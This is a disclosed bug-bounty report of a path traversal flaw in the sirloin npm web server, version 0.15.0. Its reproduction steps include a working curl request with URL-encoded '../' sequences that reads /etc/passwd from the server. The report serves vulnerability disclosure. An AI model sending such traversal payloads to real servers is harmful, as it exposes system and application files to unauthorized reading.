# [sirloin] Web Server Directory Traversal via Crafted GET Request

## Report Details
- **Report ID**: 790623
- **URL**: https://hackerone.com/reports/790623
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-02-07T16:34:25.707Z
- **Disclosed**: 2020-08-30T15:54:30.384Z

## Reporter
- **Username**: bp0lr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report path traversal in Sirloin module.
It allows an attacker to read system files via path traversal local/remote

# Module

**module name:** Sirloin
**version:** 0.15.0 (latest release build)
**npm page:** `https://www.npmjs.com/package/sirloin`

## Module Description

This high performance, extremely easy to use web server.

## Module Stats

downloads in the last year 4,129

# Vulnerability

## Vulnerability Description

Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

1 npm install sirloin
2 start the local server by typing `nodejs node_modules/sirloin/bin/sirloin.js`
3 `curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"`

it will list the content of /etc/passwd

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.
The package by default listen to 0.0.0.0 enabling external access.

## Attachments
No attachments
